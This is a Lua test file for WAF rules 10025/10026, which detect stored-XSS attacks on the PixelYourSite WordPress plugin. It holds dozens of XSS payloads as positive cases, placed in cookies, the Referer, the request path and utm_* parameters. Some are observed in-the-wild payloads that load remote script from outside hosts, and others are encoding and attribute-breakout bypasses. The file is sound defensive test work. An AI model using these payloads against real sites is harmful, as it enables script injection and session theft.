-- Tests for the PixelYourSite unauth stored-XSS detectors (rules 10025 and
-- 10026, WAF_CVE; CVE-2026-1844 / CVE-2026-1841 / CVE-2026-109987).
-- Production tier: block (10026 with its autoblock held).
--
-- The plugin stores the traffic source, the landing page and the UTMs of a
-- WooCommerce Store API checkout in the order and, before the fix, printed
-- them unescaped in the order screen. 10025 reads the plugin's own cookies;
-- 10026 the session copies it takes from the raw path, the Referer's host and
-- the utm_* query. The positives are the payloads planted on the fleet
-- (2026-02-13 .. 2026-10-10) and every bypass three review rounds found; the
-- negatives are what the plugin's JS stores there, template placeholders and
-- campaign names, and other traffic that merely mentions the names. The
-- Referer cases follow PHP 8.3's parse_url (checked with php -r).

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

-- o: { cookie, cookie_lines, referer (string or table), args, raw_uri, method, uri, body, ct }
local function req(o)
  o = o or {}
  local cookie = o.cookie or (o.cookie_lines and table.concat(o.cookie_lines, "; ")) or ""
  return { uri = o.uri or "/", args = o.args or "", method = o.method or "GET",
           raw_uri = o.raw_uri, ip = "203.0.113.96",
           headers = { referer = o.referer, cookie = o.cookie_lines,
                       ["content-type"] = o.ct },
           body = o.body or "", cookie = cookie }
end
local function ck(c) return req({ cookie = c }) end

local function fires(c, label, want_reason)
  local hit, reason = waf.check(c)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == want_reason, label .. " — reason=" .. want_reason .. " (got " .. tostring(reason) .. ")")
end
local function clean(c, label)
  local hit, reason = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got " .. tostring(reason) .. ")")
end

local P = "WAF_CVE:CVE_2026_1844:PIXELYOURSITE:"
local MARKUP, ATTR, SCRIPT_URL = P .. "COOKIE_MARKUP", P .. "COOKIE_ATTR_BREAKOUT", P .. "COOKIE_SCRIPT_URL"
local REF, UTM = P .. "REFERER_HOST_MARKUP", P .. "QUERY_UTM_MARKUP"
local PATH, PATH_ATTR = P .. "PATH_MARKUP", P .. "PATH_ATTR_BREAKOUT"

set_only({ rule_cve_pixelyoursite_xss = "block", rule_cve_pixelyoursite_session_xss = "block" })

-- ── 10025: the fleet's planted shapes ───────────────────────────────────────
fires(req({ method = "POST", uri = "/wp-json/wc/store/v1/checkout",
            cookie = 'pysTrafficSource="<script src=https://patchstackk.com/fz/x.js></script><!--P1181854187-->"; pys_landing_page="<!--P1181854187-->"' }),
      "tophair 2026-10-10 payload on the Store API checkout", MARKUP)
fires(req({ uri = "/", args = "add-to-cart=11533&quantity=4",
            cookie = 'woocommerce_cart_hash=x; pysTrafficSource="<script src=https://apix1.com/testx.js></script><!--P114512257-->"' }),
      "payload rides on the session's first GET too", MARKUP)
fires(ck('pys_landing_page="<svg onload=alert(document.domain)><!--PYS3545786-->"'), "polygraf <svg onload>", MARKUP)
fires(ck('last_pysTrafficSource=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'), "encoded <img onerror> in a last_ twin", MARKUP)
fires(ck('a=1;pysTrafficSource=<script>x</script>'), "no space after ';'", MARKUP)
fires(ck('a=1;\t  pysTrafficSource=<iframe src=//x>'), "whitespace-padded name (PHP drops it)", MARKUP)
fires(ck('PYSTRAFFICSOURCE=<script>'), "case variant over-reads on the safe side", MARKUP)
fires(ck('pys.landing.page=x<svg/onload=alert(1)>'), "dotted name PHP registers as pys_landing_page", MARKUP)
fires(ck('pys_utm_source=<img src=x onerror=alert(1)>'), "UTM cookie (printUtm prints it raw)", MARKUP)
fires(ck('last_pys_utm_campaign=%3Cbody%20onload%3Dalert(1)%3E'), "last_ UTM cookie", MARKUP)
fires(ck('pysTrafficSource=<a href=javascript:alert(1)>x</a>'), "javascript: link markup", MARKUP)
-- review: a repeated Cookie header; Apache merges the lines with ", "
fires(req({ cookie_lines = { "pysTrafficSource=foo", "<script src=//x.example/x.js></script>" } }),
      "repeated Cookie header (Apache ', ' merge)", MARKUP)

-- attribute breakout in the landing page's href
fires(ck('pys_landing_page=https://shop.gr/" onmouseover="alert(1)'), "space-separated handler", ATTR)
fires(ck('pys_landing_page=https://shop.gr/x"onmouseover="alert(1)'), "handler with no space", ATTR)
fires(ck('pys_landing_page=x%22%2Fstyle%3D%22x'), "encoded quote + /style=", ATTR)
fires(ck('pys_landing_page=x" tabindex=1 autofocus onfocus=alert(1) x="'), "other attributes first", ATTR)
fires(ck('pys_landing_page=x%22%20title%3Dy%20onmouseover%3Dalert(1)'), "encoded, title= first", ATTR)
fires(ck('pys_landing_page=x" ondragstart="alert(1)'), "any handler: ondragstart", ATTR)
fires(ck('pys_landing_page=x" autofocus onfocusout=alert(1)'), "any handler: onfocusout", ATTR)
fires(ck('pys_landing_page="x" onpointerout="alert(1)"'), "wrapped in quotes, breakout inside", ATTR)

-- a landing URL that runs on click
fires(ck('pys_landing_page=javascript:alert(document.cookie)'), "javascript:", SCRIPT_URL)
fires(ck('pys_landing_page=javascript%3Aalert(1)'), "encoded colon", SCRIPT_URL)
fires(ck('pys_landing_page=javascript:1/alert(1)'), "javascript:<digit> (not a host:port)", SCRIPT_URL)
fires(ck('pys_landing_page=javascript:0||alert(1)'), "javascript:0||", SCRIPT_URL)
fires(ck('last_pys_landing_page=java%09script:alert(1)'), "tab inside the scheme", SCRIPT_URL)
fires(ck('pys_landing_page="data:text/html;base64,PHNjcmlwdD4="'), "quoted data: URL", SCRIPT_URL)
fires(ck('pys_landing_page=vbscript:msgbox(1)'), "vbscript:", SCRIPT_URL)
fires(ck('pys_landing_page=javascript&colon;alert(1)'), "&colon; (HTML decodes it in href)", SCRIPT_URL)
fires(ck('pys_landing_page=javascript%26%2358%3Balert(1)'), "encoded &#58;", SCRIPT_URL)
fires(ck('pys_landing_page=%26%23106%3Bavascript:alert(1)'), "&#106; for the j", SCRIPT_URL)
fires(ck('pys_landing_page=java%26Tab%3Bscript:alert(1)'), "&Tab; (encoded: a raw ; ends the cookie)", SCRIPT_URL)

-- ── 10026: session copies ───────────────────────────────────────────────────
fires(req({ raw_uri = "/<iframe/srcdoc=x>" }), "raw iframe in the path", PATH)
fires(req({ raw_uri = "/x<img/src/onerror=alert(1)>" }), "raw img onerror in the path", PATH)
fires(req({ raw_uri = '/x"onmouseover="alert(1)?a=1' }), "quote opening a handler in the path", PATH_ATTR)
fires(req({ raw_uri = '/x"/title=y/onmouseover=alert(1)' }), "slash-separated attributes", PATH_ATTR)
fires(req({ raw_uri = '/x"autofocus/onfocusout=alert(1)' }), "autofocus + onfocusout", PATH_ATTR)
-- Referer host, as PHP's parse_url reads it
fires(req({ referer = "http://x<img src=x onerror=alert(1)>y" }), "markup in the host", REF)
fires(req({ referer = "https://u:p@a<svg onload=alert(1)>b:8080/path" }), "past userinfo, before the port", REF)
fires(req({ referer = "//<script>?q=1" }), "scheme-relative", REF)
fires(req({ referer = "<img src=x onerror=alert(1)>:80" }), "host:port form, no //", REF)
fires(req({ referer = "x<img src=x onerror=1>:80/p?q" }), "host:port form with a path", REF)
fires(req({ referer = { "http://x", "<img src=x onerror=alert(1)>" } }), "repeated Referer (Apache ', ' merge)", REF)
-- utm_* query ($_GET)
fires(req({ args = "utm_source=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" }), "encoded markup in utm_source", UTM)
fires(req({ args = "a=1&utm.content=<script>x</script>" }), "dotted key PHP registers as utm_content", UTM)
fires(req({ args = "%75tm_campaign=%3Csvg%2Fonload%3Dalert(1)%3E" }), "encoded key", UTM)

-- ── Negatives ───────────────────────────────────────────────────────────────
clean(req(), "nothing")
clean(ck("pysTrafficSource=google.com; pys_landing_page=https%3A%2F%2Fshop.gr%2Fproduct%2Fx%2F%3Fsrsltid%3DAU7gw4Up"),
      "plugin's real values (host + encoded URL)")
clean(ck("pysTrafficSource=direct; last_pysTrafficSource=direct; pys_landing_page=undefined"), "direct / undefined")
clean(ck("pysTrafficSource=REST API"), "the plugin's own REST API marker")
clean(ck('pysTrafficSource="google.com"'), "legal quoted cookie value")
clean(ck('pys_landing_page="https://shop.gr/?utm_content=abc&onsale=1"'), "quoted URL with utm_content / onsale")
clean(ck('pys_landing_page="https://shop.gr/p/onsale=1/lifestyle=x"'), "quoted URL with /onsale= and lifestyle=")
clean(ck("pys_landing_page=http%3A%2F%2Fshop.gr%2F"), "http landing URL")
clean(ck("pys_landing_page=%2Fcategory%2Fshoes%2F"), "relative landing path")
clean(ck("pys_landing_page=www.shop.gr:8080/x; last_pys_landing_page=localhost:8080"), "host:port landing values")
clean(ck("pys_landing_page=about:blank"), "about:blank (no script scheme)")
clean(ck("pys_landing_page=https%3A%2F%2Fshop.gr%2F%3Fa%3D1%26amp%3Bb%3D2"), "https URL with an &amp;")
clean(ck("pys_landing_page=https%3A%2F%2Fshop.gr%2F%3Fq%3Dcats%2520%2526%2520dogs"), "double-encoded query")
clean(ck("pys_utm_source=facebook; pys_utm_medium=cpc; pys_utm_campaign=summer:sale"), "real UTM cookies")
clean(ck("pys_utm_campaign=RT%20%3E%2030d; last_pys_utm_campaign=Sale >50%"), "UTM cookies with a bare >")
clean(ck("pys_utm_campaign=%3C3%20valentines"), "UTM cookie with <3")
clean(ck("pys_utm_campaign=%3Ccampaign_name%3E; pys_utm_source=<source>"), "unfilled template placeholders (review FP)")
clean(ck("pys_utm_content=%3Cb%3ENew%3C/b%3E"), "harmless <b> markup")
clean(ck("%70ysTrafficSource=%3Cscript%3E"), "encoded name: PHP does not decode cookie names")
clean(ck("pys_session_limit=true; pys_start_session=true; pysAddToCartFragmentId=x"), "other PixelYourSite cookies")
clean(ck("foo=<script>; bar=x"), "markup in an unrelated cookie")
clean(ck('foo=pysTrafficSource=<script>'), "target name only inside another cookie's value")
clean(ck("xpysTrafficSource=<script>; pysTrafficSourcex=<script>"), "near-miss names")
clean(ck("wordpress_logged_in_abc=admin%7C123; wp-settings-1=x"), "normal WP session cookies")
clean(req({ cookie_lines = { "pysTrafficSource=google.com", "wp-settings-1=x" } }), "repeated Cookie header, clean")
clean(req({ referer = "https://www.google.com/" }), "normal external Referer")
clean(req({ referer = "https://xn--hxargifdar.gr/path" }), "IDN Referer")
clean(req({ referer = "https://shop.gr/search?q=<script>" }), "markup in the Referer query")
clean(req({ referer = "https://shop.gr/<script>/x" }), "markup in the Referer path")
clean(req({ referer = "https:/x?u=//<script>" }), "a // only in the Referer query")
clean(req({ referer = "<unknown>" }), "placeholder Referer: parse_url gives no host (review FP)")
clean(req({ referer = "a<b>c" }), "bracketed junk Referer, no host")
clean(req({ referer = "<svg/onload=alert(1)>:443/x" }), "parse_url's host is just '<svg'")
clean(req({ referer = "<img onerror=1>:123456" }), "port over 5 digits: no host")
clean(req({ args = "utm_source=newsletter&utm_campaign=summer+sale" }), "real utm query")
clean(req({ args = "utm_campaign=Retargeting%20%3E%2030%20days" }), "utm with a bare >")
clean(req({ args = "utm_campaign=%3C3%20valentines" }), "utm with <3")
clean(req({ args = "utm_campaign=%3Ccampaign_name%3E&utm_source=<source>" }), "utm template placeholders")
clean(req({ args = "q=<script>" }), "markup in a non-utm field (rule 302's job)")
clean(req({ method = "POST", uri = "/contact/", body = "utm_source=%3Cscript%3E&name=x",
            ct = "application/x-www-form-urlencoded" }), "utm_* in a POST body: the plugin reads $_GET only")
clean(req({ raw_uri = "/product/%3Cscript%3E?x=<script>" }), "encoded path, markup only in the query")
clean(req({ raw_uri = "/shop/it's-fine/" }), "apostrophe in a path")
clean(req({ raw_uri = '/search/"red shoes"' }), "quoted words in a path, no handler")
clean(req({ raw_uri = "/a>b/<3/<b>/" }), "harmless raw < and > in a path")

check(det.detect_cve_pixelyoursite_xss(nil, nil) == nil, "nil everything (10025)")
check(det.detect_cve_pixelyoursite_session_xss(nil, nil, nil) == nil, "nil everything (10026, panel gate)")

set_only({ rule_cve_pixelyoursite_xss = "disabled", rule_cve_pixelyoursite_session_xss = "disabled" })
clean(ck('pysTrafficSource=<script>'), "10025 disabled")
clean(req({ raw_uri = "/<script>" }), "10026 disabled")

if fails > 0 then
  io.stderr:write(("cfm_waf PixelYourSite CVE tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf PixelYourSite stored XSS (rules 10025/10026, CVE-2026-1844)")
